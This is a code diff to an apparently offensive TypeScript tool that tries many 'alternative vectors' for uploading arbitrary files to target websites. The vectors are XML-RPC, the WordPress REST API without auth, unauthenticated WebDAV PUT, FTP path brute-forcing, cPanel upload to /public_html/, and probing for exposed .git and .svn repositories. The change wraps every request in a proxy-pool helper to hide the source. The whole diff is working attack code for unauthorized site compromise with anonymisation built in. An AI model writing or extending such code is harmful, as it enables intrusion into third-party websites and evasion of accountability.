@@ -12,6 +12,19 @@
 
 import { fetchWithPoolProxy } from "./proxy-pool";
 
+// Helper: wrap fetch with proxy pool
+async function altVecFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+    return response;
+  } catch (e) {
+    // Fallback to direct fetch if proxy fails
+    return fetch(url, init);
+  }
+}
+
+
 export interface AltUploadResult {
   vector: string;
   success: boolean;
@@ -43,7 +56,7 @@ async function tryXmlRpcUpload(config: AltUploadConfig): Promise<AltUploadResult
   // First check if XML-RPC is enabled
   try {
     log("xmlrpc", "Checking if XML-RPC is enabled...");
-    const checkResp = await fetch(xmlrpcUrl, {
+    const checkResp = await altVecFetch(xmlrpcUrl, {
       method: "POST",
       headers: { "Content-Type": "text/xml" },
       body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
@@ -80,7 +93,7 @@ async function tryXmlRpcUpload(config: AltUploadConfig): Promise<AltUploadResult
   </params>
 </methodCall>`;
 
-      const uploadResp = await fetch(xmlrpcUrl, {
+      const uploadResp = await altVecFetch(xmlrpcUrl, {
         method: "POST",
         headers: { "Content-Type": "text/xml" },
         body: uploadXml,
@@ -127,7 +140,7 @@ async function tryXmlRpcUpload(config: AltUploadConfig): Promise<AltUploadResult
 </methodCall>`;
 
       try {
-        const resp = await fetch(xmlrpcUrl, {
+        const resp = await altVecFetch(xmlrpcUrl, {
           method: "POST",
           headers: { "Content-Type": "text/xml" },
           body: uploadXml,
@@ -179,7 +192,7 @@ async function tryRestApiUpload(config: AltUploadConfig): Promise<AltUploadResul
       if (config.wpCredentials) {
         const authHeader = `Basic ${Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.appPassword}`).toString("base64")}`;
 
-        const resp = await fetch(apiUrl, {
+        const resp = await altVecFetch(apiUrl, {
           method: "POST",
           headers: {
             "Authorization": authHeader,
@@ -200,7 +213,7 @@ async function tryRestApiUpload(config: AltUploadConfig): Promise<AltUploadResul
       }
 
       // Try without auth (some misconfigured sites)
-      const noAuthResp = await fetch(apiUrl, {
+      const noAuthResp = await altVecFetch(apiUrl, {
         method: "POST",
         headers: {
           "Content-Disposition": `attachment; filename="${config.filename}"`,
@@ -250,7 +263,7 @@ async function tryWebDavUpload(config: AltUploadConfig): Promise<AltUploadResult
 
     try {
       // Try PUT without auth
-      const resp = await fetch(uploadUrl, {
+      const resp = await altVecFetch(uploadUrl, {
         method: "PUT",
         headers: { "Content-Type": "application/octet-stream" },
         body: config.fileContent,
@@ -259,7 +272,7 @@ async function tryWebDavUpload(config: AltUploadConfig): Promise<AltUploadResult
 
       if (resp.status === 201 || resp.status === 204 || resp.status === 200) {
         // Verify file exists
-        const checkResp = await fetch(uploadUrl, {
+        const checkResp = await altVecFetch(uploadUrl, {
           method: "HEAD",
           signal: AbortSignal.timeout(5000),
         });
@@ -271,11 +284,11 @@ async function tryWebDavUpload(config: AltUploadConfig): Promise<AltUploadResult
       // Try MKCOL + PUT
       if (resp.status === 405 || resp.status === 409) {
         try {
-          await fetch(`${baseUrl}${davPath}`, {
+          await altVecFetch(`${baseUrl}${davPath}`, {
             method: "MKCOL",
             signal: AbortSignal.timeout(5000),
           });
-          const retryResp = await fetch(uploadUrl, {
+          const retryResp = await altVecFetch(uploadUrl, {
             method: "PUT",
             headers: { "Content-Type": "application/octet-stream" },
             body: config.fileContent,
@@ -338,7 +351,7 @@ async function tryFtpBrute(config: AltUploadConfig): Promise<AltUploadResult> {
 
   for (const ftpUrl of ftpWebPaths) {
     try {
-      const resp = await fetch(ftpUrl, {
+      const resp = await altVecFetch(ftpUrl, {
         method: "GET",
         redirect: "follow",
         signal: AbortSignal.timeout(5000),
@@ -392,7 +405,7 @@ async function tryCpanelApi(config: AltUploadConfig): Promise<AltUploadResult> {
   for (const cpUrl of cpanelUrls) {
     try {
       log("cpanel", `Checking cPanel at ${cpUrl}...`);
-      const resp = await fetch(cpUrl, {
+      const resp = await altVecFetch(cpUrl, {
         method: "GET",
         redirect: "follow",
         signal: AbortSignal.timeout(5000),
@@ -418,7 +431,7 @@ async function tryCpanelApi(config: AltUploadConfig): Promise<AltUploadResult> {
               const boundary = `----FormBoundary${Math.random().toString(36).slice(2)}`;
               const body = `--${boundary}\r\nContent-Disposition: form-data; name="dir"\r\n\r\n/public_html/\r\n--${boundary}\r\nContent-Disposition: form-data; name="file-1"; filename="${config.filename}"\r\nContent-Type: application/octet-stream\r\n\r\n${config.fileContent}\r\n--${boundary}--`;
 
-              const uploadResp = await fetch(apiUrl, {
+              const uploadResp = await altVecFetch(apiUrl, {
                 method: "POST",
                 headers: {
                   "Authorization": authHeader,
@@ -477,7 +490,7 @@ async function tryGitSvnExposed(config: AltUploadConfig): Promise<AltUploadResul
   for (const { path, type } of exposedPaths) {
     try {
       log("git_svn", `Checking ${path}...`);
-      const resp = await fetch(`${baseUrl}${path}`, {
+      const resp = await altVecFetch(`${baseUrl}${path}`, {
         method: "GET",
         signal: AbortSignal.timeout(5000),
       });
@@ -489,7 +502,7 @@ async function tryGitSvnExposed(config: AltUploadConfig): Promise<AltUploadResul
           log("git_svn", `🔓 Git repository exposed at ${baseUrl}/.git/`);
 
           // Try to extract useful info from git config
-          const configResp = await fetch(`${baseUrl}/.git/config`, {
+          const configResp = await altVecFetch(`${baseUrl}/.git/config`, {
             method: "GET",
             signal: AbortSignal.timeout(5000),
           });
